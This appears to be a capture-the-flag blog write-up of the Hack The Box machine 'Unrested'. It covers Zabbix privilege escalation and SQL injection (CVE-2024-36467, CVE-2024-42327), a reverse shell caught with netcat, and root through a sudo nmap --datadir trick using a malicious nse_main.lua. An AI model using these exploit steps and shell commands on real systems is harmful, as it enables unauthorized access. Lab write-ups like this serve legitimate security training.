---
title: HTB Unrested Writeup
description: Unrested is a medium-level Linux machine on HTB, which released on December 5, 2024.
date: 2025-01-15 11:33:00 +0800
categories: [HacktheBox, Medium]
tags: [ctf, hackthebox, linux]
math: true
mermaid: true
image:
  path: /assets/img/htb/unrested.htb/unrested.png
---
## Box Info
Unrested is a medium difficulty Linux machine hosting a version of Zabbix . Enumerating the version of Zabbix shows that it is vulnerable to both CVE-2024-36467 and CVE-2024-42327 which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a sudo misconfiguration allowing the zabbix user to execute sudo /usr/bin/nmap , which is leveraged to gain root access.

## Recon
### Nmap

Starting with nmap scan as asual which gives port `22` and `80` open.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-unrested]
└──╼ $nmap -sVC 10.10.11.50 -oA unrested
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 16:28 +03
Nmap scan report for 10.10.11.50
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.60 seconds
```
### Port 80 - Zabbix

Zabbix is an open-source monitoring tool used to track the performance and availability of IT infrastructure, including servers, networks, applications, and devices. 

We have already credentials given from the box creator `matthew:96qzn0h2e1k3`. Let's login.

![zabbix1](/assets/img/htb/unrested.htb/zabbix.jpg){: width="800" height="500" }

We got the dashboard page. The Zabbix version can be seen as `7.0.0`. Searching the web gives us two vulnerabilities. `CVE-2024-36467` and `CVE-2024-42327`.

## Shell as zabbix user
### CVE-2024-36467

CVE-2024-36467 is a vulnerability where attacker can abuse missing access controls in the `user.update` function in `CUser.php` class to change their role to a Administrator.

To exploit, we first need to authenticate to API using `api_jsonrpc.php` and our credentials. For API usage check [**this**](https://www.zabbix.com/documentation/current/en/manual/api) link.

![burp1](/assets/img/htb/unrested.htb/burp1.jpg){: width="800" height="500" }

Successfully got a API token. Before we try `user.update` to update our roles, let's try to find our `userid`. Bruteforcing the userids also work but we can see every user id using `user.get` function. Using the selectRole or SelectUsrgrps as params returns the userlist and scrolling down, we can see `matthew` user as `userid:3`.

![burp2](/assets/img/htb/unrested.htb/burp2.jpg){: width="800" height="500" }

From the json response we can also see that Administrator role is `roleid:3` and matthew user has `roleid:1` which is probably the default user id. Let's try to set our roleid to Administrator. But we get the following error.

![burp3](/assets/img/htb/unrested.htb/burp3.jpg){: width="800" height="500" }

So it seems that we can't change our role beacuse in `CUser.php` file, `validateUpdate()` and `checkHimself()` functions checks if its our own role or not. But we also see that in user.update, we can change our `usrgroup` which doesn't have any validation placed. 

We also need to find a valid "usrgrpid" to make us Administrator. Luckily, i have seen `Zabbix Administrators` id in the manual page as `7`. This is crucial beacause it saves time from `bruteforcing` all the group ids.

![burp4](/assets/img/htb/unrested.htb/burp4.jpg){: width="800" height="500" }

Now that we have the group id, let's add our user to `Zabbix Administrators` using `user.update`. Note that without this privilege escalation, we can't perform the `SQL injection` in the upcoming part .

![burp5](/assets/img/htb/unrested.htb/burp5.jpg){: width="800" height="500" }

### CVE-2024-42327

CVE-2024-42327 is a vulnerability where attacker can perform an SQL injection in `user.get` function in `CUser.php` class which can be used to leak database content.

Using the following request, we can see that request took 5,065 ms which means our `SLEEP(5)` payload resulted with time-based sql injection.

![burp6](/assets/img/htb/unrested.htb/burp6.jpg){: width="800" height="500" }

Let's replace the sqli payload with `*` and copy the request to a file. Then dump the database using `sqlmap`.

![burp7](/assets/img/htb/unrested.htb/burp7.jpg){: width="800" height="500" }

Got a 2 results for `admin` user, we know sessionids expire after some time so trying to see which is the valid one. First sessionid works out.

![burp8](/assets/img/htb/unrested.htb/burp8.jpg){: width="800" height="500" }

Now that we have admin session, using our privileges we can get `Remote Code Execution`. Trying [**this**](https://www.exploit-db.com/exploits/39937) method on exploit-db doesn't seem to work. Another way is to use `item.create` method to execute a system command.

Hosting a simple reverse shell on port 8000 and using the command below, returns a connection.

![burp9](/assets/img/htb/unrested.htb/burp9.jpg){: width="800" height="500" }

```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-unrested]
└──╼ $nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.50] 40504
bash: cannot set terminal process group (3689): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@unrested:/$ 
```
User flag can be found in `/home/matthew/user.txt`

## Shell as root

Checking our sudo privileges using `sudo -l` says we can execute `/usr/bin/nmap` as root without password.

```console
zabbix@unrested:/home$ sudo -l
Matching Defaults entries for zabbix on unrested:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zabbix may run the following commands on unrested:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap *
zabbix@unrested:/home$ 
```
Trying `--script` and `--interactive` methods on [**gtfobins**](https://gtfobins.github.io/gtfobins/nmap/) but both dont work. Also gives an unusual error.

```console
zabbix@unrested:/tmp$ TF=$(mktemp)
zabbix@unrested:/tmp$ echo 'os.execute("/bin/sh")' > $TF
zabbix@unrested:/tmp$ sudo /usr/bin/nmap --script=$TF
Script mode is disabled for security reasons.
zabbix@unrested:/tmp$ nmap --interactive
Interactive mode is disabled for security reasons.
zabbix@unrested:/tmp$
```
From this we can tell this is a `modified binary` because nmap never gives this kinda error. Checking `/usr/bin/nmap`, it is indeed modified.

```console
zabbix@unrested:/tmp$ cat /usr/bin/nmap
#!/bin/bash

#################################
## Restrictive nmap for Zabbix ##
#################################

# List of restricted options and corresponding error messages
declare -A RESTRICTED_OPTIONS=(
    ["--interactive"]="Interactive mode is disabled for security reasons."
    ["--script"]="Script mode is disabled for security reasons."
    ["-oG"]="Scan outputs in Greppable format are disabled for security reasons."
    ["-iL"]="File input mode is disabled for security reasons."
)

# Check if any restricted options are used
for option in "${!RESTRICTED_OPTIONS[@]}"; do
    if [[ "$*" == *"$option"* ]]; then
        echo "${RESTRICTED_OPTIONS[$option]}"
        exit 1
    fi
done

# Execute the original nmap binary with the provided arguments
exec /usr/bin/nmap.original "$@"
zabbix@unrested:/tmp$ 
```

Basicly we have to try options other than --interactive, --script, -oG and -iL.

Reading through the nmap documentation there is a interesting option called `--datadir`. 
This option allows you to specify a data directory other than the default nmap script directory which is `/usr/share/nmap`. 
And using `-sC` option executes the --script=default which is `nse_main.lua` in /usr/share/nmap.

By crafting a malicious nse_main.lua, we got `root`.

```console
zabbix@unrested:/tmp$ echo 'os.execute("/bin/bash -p")' > nse_main.lua
zabbix@unrested:/tmp$ sudo /usr/bin/nmap -sC --datadir=/tmp
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-15 19:43 UTC
id
uid=0(root) gid=0(root) groups=0(root)
```

Root flag can be found in `/root/root.txt`